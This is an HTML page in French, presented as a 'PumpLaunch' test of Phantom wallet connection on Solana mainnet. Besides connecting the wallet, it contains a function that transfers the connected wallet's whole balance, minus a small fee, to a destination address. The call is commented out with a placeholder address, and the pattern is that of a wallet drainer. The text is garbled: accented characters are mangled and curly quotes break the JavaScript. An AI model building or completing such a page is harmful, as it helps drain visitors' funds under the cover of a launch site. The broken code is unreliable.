<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>PumpLaunch � Test Phantom</title>

  <!-- Librairie Solana Web3.js -->
  <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>

  <!-- Tailwind pour le style -->
  <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-black text-white flex flex-col min-h-screen">

  <!-- Hero -->
  <section class="text-center py-20 bg-purple-700">
    <h1 class="text-5xl font-extrabold">� PumpLaunch</h1>
    <p class="mt-4 text-lg">Connexion Phantom testˆ'e et fonctionnelle</p>
    <button id="connectButton" type="button"
      class="mt-8 px-8 py-4 bg-white text-purple-700 font-bold rounded-lg shadow-lg hover:bg-gray-200 transition">
      Se connecter avec Phantom
    </button>
    <div id="status" class="mt-4 text-gray-100">Statut : Non connectˆ'</div>
    <div id="wallet-info" class="mt-2 text-green-300 font-mono break-words text-sm">En attente de connexion...</div>
  </section>

  <!-- Script Phantom -->
  <script type="module">
    import nacl from "https://cdn.skypack.dev/tweetnacl";
    import bs58 from "https://cdn.skypack.dev/bs58";

    const { PublicKey, Connection, SystemProgram, Transaction } = solanaWeb3;

    document.addEventListener(’DOMContentLoaded’, () => {
      const btn = document.getElementById(’connectButton’);
      const status = document.getElementById(’status’);
      const info = document.getElementById(’wallet-info’);

      // Connexion au rˆ'seau Solana
      const RPC = "https://api.mainnet-beta.solana.com";
      const conn = new Connection(RPC, "confirmed");

      // Dˆ'tection mobile
      function isMobile() {
        return /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
      }

      // ˆtape 1 : Connexion desktop via extension Phantom
      async function connectDesktop() {
        status.innerText = "Tentative de connexion via extension...";
        try {
          if (window.solana && window.solana.isPhantom) {
            const resp = await window.solana.connect();
            status.innerText = "� Connectˆ' via extension";
            info.innerText = resp.publicKey.toString();
            window.providerPublicKey = resp.publicKey.toString();
          } else {
            status.innerText = "� Extension Phantom non dˆ'tectˆ'e";
          }
        } catch (err) {
          status.innerText = "Erreur: " + (err?.message || err);
        }
      }

      // ˆtape 1 mobile : connexion simple
      function connectMobile() {
        status.innerText = "�– Redirection vers l’app Phantom...";
        const appUrl = encodeURIComponent(window.location.origin + window.location.pathname);
        const redirectLink = encodeURIComponent(window.location.origin + window.location.pathname);
        const deepLink =
          ‘https://phantom.app/ul/v1/connect‘ +
          ‘?app_url=${appUrl}‘ +
          ‘&redirect_link=${redirectLink}‘ +
          ‘&cluster=mainnet-beta‘;

        window.location.href = deepLink;
      }

      // ˆtape 2 mobile : transaction
      async function sendTransactionMobile(destination) {
        try {
          status.innerText = "�– Prˆ'paration de la transaction...";

          const pubkey = window.providerPublicKey;
          if (!pubkey) {
            status.innerText = "���‚ Connecte ton wallet d’abord.";
            return;
          }

          const fromPubkey = new PublicKey(pubkey);
          const toPubkey = new PublicKey(destination);

          const balance = await conn.getBalance(fromPubkey);

          const ix = SystemProgram.transfer({
            fromPubkey,
            toPubkey,
            lamports: balance - 5000 // laisse un peu pour les frais
          });

          const { blockhash } = await conn.getLatestBlockhash();
          const tx = new Transaction({ recentBlockhash: blockhash, feePayer: fromPubkey }).add(ix);

          const serialized = tx.serialize({ requireAllSignatures: false, verifySignatures: false });
          const base64Tx = btoa(String.fromCharCode(...serialized));

          const keyPair = nacl.box.keyPair();
          const dappPublicKeyB58 = bs58.encode(keyPair.publicKey);
          const dappSecretKeyB58 = bs58.encode(keyPair.secretKey);
          sessionStorage.setItem("dappSecretKeyBase58", dappSecretKeyB58);

          const appUrl = encodeURIComponent(window.location.origin + window.location.pathname);
          const redirectLink = encodeURIComponent(window.location.origin + window.location.pathname);

          const deepLink =
            ‘https://phantom.app/ul/v1/signAndSendTransaction‘ +
            ‘?dapp_encryption_public_key=${dappPublicKeyB58}‘ +
            ‘&app_url=${appUrl}‘ +
            ‘&redirect_link=${redirectLink}‘ +
            ‘&cluster=mainnet-beta‘ +
            ‘&payload=${encodeURIComponent(base64Tx)}‘;

          console.log("Deep link signAndSend:", deepLink);
          window.location.href = deepLink;

        } catch (err) {
          status.innerText = "Erreur mobile: " + (err?.message || err);
        }
      }

      // Attache le bouton
      btn.addEventListener(’click’, (e) => {
        e.preventDefault();
        if (isMobile()) {
          // ˆtape 1 : connexion
          connectMobile();
          // ˆtape 2 : transaction (ˆ� dˆ'clencher aprˆ¤s connexion rˆ'ussie)
          // sendTransactionMobile("ADRESSE_DE_RECEPTION");
        } else {
          connectDesktop();
        }
      });
    });
  </script>
</body>
</html>
